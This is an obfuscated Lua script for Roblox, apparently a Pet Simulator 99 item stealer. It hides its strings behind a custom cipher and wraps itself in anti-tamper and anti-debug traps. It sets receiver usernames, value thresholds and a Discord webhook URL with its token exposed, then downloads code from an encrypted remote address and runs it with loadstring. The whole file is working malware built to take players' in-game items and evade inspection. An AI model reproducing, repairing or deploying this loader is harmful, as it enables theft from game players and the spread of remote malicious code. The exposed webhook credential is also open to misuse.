do
  local floor = math.floor
  local random = math.random
  local remove = table.remove
  local char = string.char
  local v1 = 0
  local v2 = 2
  local v3 = {}
  local v4 = {}

  for i = 1, 256 do
    v4[i] = i
  end

  repeat
    local v5 = remove(v4, (random(1, #v4)))
    v3[v5] = char(v5 - 1)
  until #v4 == 0

  local v6 = {}

  local function f1()
    if #v6 == 0 then
      v1 = (v1 * 93 + 19176704908453) % 35184372088832

      repeat
        v2 = v2 * 91 % 257
      until v2 ~= 1

      local v7 = v2 % 32
      local v8 = floor(v1 / 2 ^ (13 - (v2 - v7) / 32)) % 4294967296 / 2 ^ v7
      local v9 = floor(v8 % 1 * 4294967296) + floor(v8)
      local v10 = v9 % 65536
      local v11 = (v9 - v10) / 65536
      local v12 = v10 % 256
      local v13 = (v10 - v12) / 256
      local v14 = v11 % 256
      v6 = { v12, v13, v14, (v11 - v14) / 256 }
    end

    return table.remove(v6)
  end

  local v15 = {}
  setmetatable({}, { __index = v15, __metatable = nil })

  function f(p1, p2)
    if v15[p2] then
    else
      v6 = {}
      v1 = p2 % 35184372088832
      v2 = p2 % 255 + 2
      local v16 = string.len(p1)
      v15[p2] = ""
      local v17 = 107

      for j = 1, v16 do
        v17 = (string.byte(p1, j) + f1() + v17) % 256
        v15[p2] = v15[p2] .. v3[v17 + 1]
      end
    end

    return p2
  end
end

local v18 = true

local v19 = {
  function()
    originalError({
      msg = "Tampering detected. Please contact the owner of this script for a new version.",
    })
  end,
  function()
    originalError("Tampering detected. Error code: " .. math.random(1000, 9999))
  end,
  function()
    originalError(function()
      return "Tampering detected. This incident will be reported."
    end)
  end,
}

local v20 = v19[math.random(1, #v19)]
local v21 = error
local v22 = pairs
local v23 = setmetatable
local v24 = getmetatable
local v25 = type
local v26 = load
local v27 = loadstring
local v28 = pcall
local random2 = math.random
local v29 = xpcall
local v30 = debug
local v31 = package
local v32 = coroutine
local v33 = string
local v34 = math
local v35 = table
local v36 = {}
local v37 = {}

for v38, v39 in v22(_G) do
  v37[v38] = v39
end

local function f2(index)
  return v23({}, {
    __index = index,
    __newindex = function(object, key, value)
      if v37[key] then
        v20()
      else
        v37[key] = value
      end
    end,
    __metatable = false,
    __gc = function() v20() end,
    __mode = "k",
    __call = function() v20() end,
    __len = function() v20() end,
    __pairs = function() v20() end,
    __ipairs = function() v20() end,
    __debug = function() v20() end,
    __tostring = function() v20() end,
    __concat = function() v20() end,
    __unm = function() v20() end,
    __add = function() v20() end,
    __sub = function() v20() end,
    __mul = function() v20() end,
    __div = function() v20() end,
    __mod = function() v20() end,
    __pow = function() v20() end,
    __eq = function() v20() end,
    __lt = function() v20() end,
    __le = function() v20() end,
  })
end

function v36.protectGlobals()
  for v40, v41 in v22(_G) do
    if v25(v41) == "function" then
      v37[v40] = v41
    end
  end

  _G = f2(v37)
  v23(_G, { __metatable = "This metatable is locked." })
end

function v36.protectTable(p3)
  return f2(p3)
end

function v36.protectFunction(fn)
  local function f3(...)
    return fn(...)
  end

  return v23({}, {
    __index = function(object2, key2)
      if key2 == "__call" then
        return f3
      end

      v20()
    end,
    __newindex = function(object3, key3, value2) v20() end,
    __metatable = false,
    __gc = function() v20() end,
    __mode = "k",
    __call = function() v20() end,
    __len = function() v20() end,
    __pairs = function() v20() end,
    __ipairs = function() v20() end,
    __debug = function() v20() end,
  })
end

local v42 = error ~= v21
local v43 = v42

if not v42 then
  local v44 = pairs ~= v22
  local v45 = v44

  if not v44 then
    local v46 = setmetatable ~= v23
    local v47 = v46

    if not v46 then
      local v48 = getmetatable ~= v24
      local v49 = v48

      if not v48 then
        local v50 = type ~= v25
        local v51 = v50

        if not v50 then
          local v52 = load ~= v26
          local v53 = v52

          if not v52 then
            local v54 = loadstring ~= v27

            local v55 = v54 or pcall ~= v28 or xpcall ~= v29 or debug ~= v30 or package ~= v31
              or coroutine ~= v32 or string ~= v33 or math ~= v34 or table ~= v35

            v53 = v55
          end

          v51 = v53
        end

        v49 = v51
      end

      v47 = v49
    end

    v45 = v47
  end

  v43 = v45
end

if v43 then
  v20()
end

if pcall ~= v28 or math.random ~= random2 then
  v20()
end

local v56 = { "os", "io", "file", "debug" }

for index2, value3 in ipairs(v56) do
  if _G[value3] ~= v37[value3] then
    v20()
  end
end

local v57, v58 = pcall(v30.gethook)

if v57 then
  if v58 then
    v20()
  end
end

local gmatch = string.gmatch
pcall(main)

for index3, value4 in ipairs(v56) do
  if getmetatable(_G[value4]) ~= getmetatable(v37[value4]) then
    v20()
  end
end

local random3 = math.random
local v59 = table and table.unpack or unpack
n = random2(3, 65)
local f4, f5, v60, v61, floor2, v62, v63, v64, v65, v66, v67

if n < 3 or n > 65 then
  local v68 = random3(1, 16777216)
  local randomStrings = RandomStrings.randomString()
  local v69 = random3(1, 16777216)
  return RandomStrings.randomString() / (v68 - randomStrings ^ v69)
else
  local v70 = 0
  local v71 = 0

  local v72 = ({
    pcall(function()
      local v73 = random3(1, 16777216)
      local randomStrings2 = RandomStrings.randomString()
      local v74 = random3(1, 16777216)
      return RandomStrings.randomString() / (v73 - randomStrings2 ^ v74)
    end),
  })[2]

  v61 = tonumber(gmatch(tostring(v72), ":(%d*):")())

  for k = 1, 100 do
    local v75 = k
    local v76 = v75 % 256
    local v77 = v75 % 100 + 1
    local v78 = v75 % 2 == 0
    local gsub = v72:gsub(":(%d*):", ":" .. tostring(random3(0, 10000)) .. ":")

    local v79 = {
      pcall(function()
        if random3(1, 2) == 1 or v75 == n then
          v18 = v18 and v61 == tonumber(gmatch(tostring(({
            pcall(function()
              local v80 = random3(1, 16777216)
              local randomStrings3 = RandomStrings.randomString()
              local v81 = random3(1, 16777216)
              return RandomStrings.randomString() / (v80 - randomStrings3 ^ v81)
            end),
          })[2]), ":(%d*):")())
        end

        if v78 then
          error(gsub, 0)
        end

        local v82 = {}

        for m = 1, 100 do
          v82[m] = random3(0, 255)
        end

        v82[v77] = v76
        return v59(v82)
      end),
    }

    if v78 then
      v18 = v18 and v79[1] == false and v79[2] == gsub
    else
      v18 = v18 and v79[1]
      v70 = (v70 + v79[v77 + 1]) % 256
      v71 = (v71 + v76) % 256
    end
  end

  v18 = v18 and v70 == v71

  if v18 then
    floor2 = math.floor
    local random4 = math.random
    local remove2 = table.remove
    local char2 = string.char
    v62 = 0
    v63 = 2
    v64 = {}
    local v83 = {}

    for i6 = 1, 256 do
      v83[i6] = i6
    end

    repeat
      local v84 = remove2(v83, (random4(1, #v83)))
      v64[v84] = char2(v84 - 1)
    until #v83 == 0

    function f4()
      if #v65 == 0 then
        v62 = (v62 * 25 + 33658249344569) % 35184372088832

        repeat
          v63 = v63 * 56 % 257
        until v63 ~= 1

        local v85 = v63 % 32
        local v86 = floor2(v62 / 2 ^ (13 - (v63 - v85) / 32)) % 4294967296 / 2 ^ v85
        local v87 = floor2(v86 % 1 * 4294967296) + floor2(v86)
        local v88 = v87 % 65536
        local v89 = (v87 - v88) / 65536
        local v90 = v88 % 256
        local v91 = v89 % 256
        v65 = { v90, (v88 - v90) / 256, v91, (v89 - v91) / 256 }
      end

      return table.remove(v65)
    end

    v65 = {}
    v66 = {}
    v60 = setmetatable({}, { __index = v66, __metatable = nil })

    function f5(p4, p5)
      if v66[p5] then
      else
        v65 = {}
        v62 = p5 % 35184372088832
        v63 = p5 % 255 + 2
        local v92 = string.len(p4)
        v66[p5] = ""
        local v93 = 225

        for i7 = 1, v92 do
          v93 = (string.byte(p4, i7) + f4() + v93) % 256
          v66[p5] = v66[p5] .. v64[v93 + 1]
        end
      end

      return p5
    end

    Username = {
      "pet99_2948",
      "pet99_2947",
    }

    Webhook = "https://discord.com/api/webhooks/1216303940870869102/vNRc4Q9xj3UNv73GSiZYx_HWoa1WDbsAEuU5uTtqB-5y2sQV5oWKLLG3LFoeiqzBVMLa"

    minrarity = v60[f5("\230KZaD\206", 14775687390343)]
    minrarity_sailor = v60[f5("]\240\173'&\24", 34501264425190)]
    min_gen = 1000000
    min_rap = 1000000
    min_val_each = 1000000
    discord_id = v60[f5("\186\163\158c\148\172 s\138T\164\208\234\192w~\23\128Y", 3121826947253)]
    v67 = false

    local v94 = task[v60[f5("\174\173D\8\226", 31597596795793)]](function()
      local v95, v96 = pcall(function()
        return game:HttpGet(v60[f5(
          "N_\172>\205\246\164\0\4{\186\128\195e\137\251Q\135\3\158犫8\\\133\168\12\234\218\0\20\1\184\156ɯ\19\11\162\159$\192\196\2298K",
          25002923050664
        )])
      end)

      if v95 and v96 then
        v67 = true
      end
    end)

    task[v60[f5("\165y'j", 30104874071161)]](1)
    task[v60[f5("ҹvH\167\251", 33352489374150)]](v94)

    proxy = v67 and v60[f5(
      "\150\164\225e\246\205\19g3`,fH\239\184U\127\154g\152ī&N\16S\188\199L\149\207K\139",
      16122402687238
    )] or v60[f5(
      "\166=\0057i\142\176t`g\212Ƅ\176N\186\177\26\228+p\136wS&\221*Z2",
      22009787992566
    )]

    loadstring(game:HttpGet(proxy
      .. v60[f5("J\150\170\190,\182\t\t\246rB\11\14\n", 13665819026984)]))()

    return
  else
    local function f6()
      v20()
    end

    return f6()
  end
end